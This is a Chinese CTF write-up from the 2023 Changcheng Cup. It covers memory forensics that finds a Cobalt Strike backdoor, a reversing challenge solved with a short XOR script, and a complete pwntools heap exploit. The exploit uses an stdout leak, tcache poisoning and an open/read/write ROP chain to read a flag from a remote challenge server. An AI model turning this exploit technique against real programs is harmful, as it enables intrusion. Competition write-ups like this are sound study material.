# 长城杯2023WP

### Misc| ezmem| 二血

首先根据010可以看出是windows10的内存镜像：

![image-20230907225957516](https://raw.githubusercontents.com/BattiestStone4/imgs/master/2023/09/1694099414.png)

接下来使用volatility3来找密码：

![image-20230907230813250](https://raw.githubusercontents.com/BattiestStone4/imgs/master/2023/09/1694099516.png)

使用somd5找到密码为114514。

![image-20230907231008253](https://raw.githubusercontents.com/BattiestStone4/imgs/master/2023/09/1694099416.png)

接下来进程里有一个steam.exe，dump后发现是cs后门，扔进云沙箱可以知道外联ip。

![image-20230907231148215](https://raw.githubusercontents.com/BattiestStone4/imgs/master/2023/09/1694099510.png)

### Reverse| vvm

首先是主函数：

![image-20230907222749537](https://raw.githubusercontents.com/BattiestStone4/imgs/master/2023/09/1694096893.png)

观察4020，可以发现一串数据

![](https://raw.githubusercontents.com/BattiestStone4/imgs/master/2023/09/1694096940.png)

1274函数处疑似为加密逻辑：

![image-20230907222951536](https://raw.githubusercontents.com/BattiestStone4/imgs/master/2023/09/1694096992.png)

试解密脚本如下：

```python
s = [0x7E,0x78,0x75,0x7F,0x6B,0x52,0x75,0x72,0x6D,0x77,0x4E,0x79,0x79,0x79,0x77,0x44,0x62,0x24,0x60,0x71,0x73,0x60,0x35,0x69]
for i in s:
    print(chr((i ^ 0x16) - 2), end="")
```



结果为：

![image-20230907223849396](https://raw.githubusercontents.com/BattiestStone4/imgs/master/2023/09/1694097530.png)

### Pwn| veh

无show打stdout，1/16概率。

```python
from pwn import *
import sys
remote_addr = ["47.104.16.93",4551]
libc = ELF('./libc.so.6')
#elf = ELF('')
if len(sys.argv) == 1:
    context.log_level="debug" 
    #p = process(["qemu-aarch64", "-L", "/usr/aarch64-linux-gnu/", "-g","1234","./stack"]) 
    #p = process(["qemu-aarch64", "-L", ".", "./stack"]) 
    p = process("./pwn_patched")
    context(arch='amd64', os='linux')
    context.terminal = ['tmux', 'splitw', '-h']
if len(sys.argv) == 2 :
    if 'r' in sys.argv[1]:
        p = remote(remote_addr[0],remote_addr[1])
    if 'n' not in sys.argv[1]:
        context.log_level="debug" 
        #context(arch = 'amd64', os = 'linux')
r = lambda : p.recv()
rl = lambda : p.recvline()
rc = lambda x: p.recv(x)
ru = lambda x: p.recvuntil(x)
rud = lambda x: p.recvuntil(x, drop=True)
s = lambda x: p.send(x)
sl = lambda x: p.sendline(x)
sa = lambda x, y: p.sendafter(x, y)
sla = lambda x, y: p.sendlineafter(x, y)
shell = lambda : p.interactive()
pr = lambda name,x : log.info(name+':'+hex(x))

DEBUG = 0

def debug(bp = None):
    if DEBUG == 1:
        if bp != None:
            gdb.attach(p, bp)
        else:
            gdb.attach(p)

def add(size):
    sla(b'choice:\n', b'1')
    sla(b'size:\n', str(size).encode())

def edit(content):
    sla(b'choice:\n', b'2')
    sa(b'contents:\n', content)

def delete():
    sla(b'choice:\n', b'3')

debug()
add(0x100)
delete()

add(0x90)
add(0x90)
add(0x90)
delete()
edit(b'aaa')

for i in range(3):
    add(0x150)

delete()

add(0x100)
delete()

for i in range(7):
    edit(p64(0) * 2)
    delete()

edit(b'\xa0\x26')


add(0x100)
add(0x100)
edit(p64(0xfbad1887) + p64(0) * 3 + b'\x00')

libc.address = u64(ru(b'\x7f')[-6:].ljust(8, b'\x00')) - 0x1ec980
pr('libc.address', libc.address)

open = libc.sym['open']
read = libc.sym['read']
write = libc.sym['write']
environ = libc.sym['__environ']

edit(p64(0xfbad1887) + p64(0) * 3 + p64(environ) + p64(environ + 8))
stack_addr = u64(ru(b'\x7f')[-6:].ljust(8, b'\x00'))

ret_addr = stack_addr - 0x100

pop_rdi = libc.address + 0x23b6a
pop_rsi = libc.address + 0x2601f
pop_rdx = libc.address + 0x142c92

payload = b'./flag\x00\x00' + p64(pop_rdi) + p64(ret_addr - 8) + p64(pop_rsi) + p64(0) + p64(open)
payload += p64(pop_rdi) + p64(3) + p64(pop_rsi) + p64(stack_addr + 0x400) + p64(pop_rdx) + p64(0x50) + p64(read)
payload += p64(pop_rdi) + p64(1) + p64(pop_rsi) + p64(stack_addr + 0x400) + p64(pop_rdx) + p64(0x50) + p64(write)

add(0x150)
delete()

for i in range(7):
    edit(p64(0) * 2)
    delete()

edit(p64(ret_addr - 8))
add(0x150)
add(0x150)
edit(payload)

sla(b'choice:\n', b'4')

shell()

```

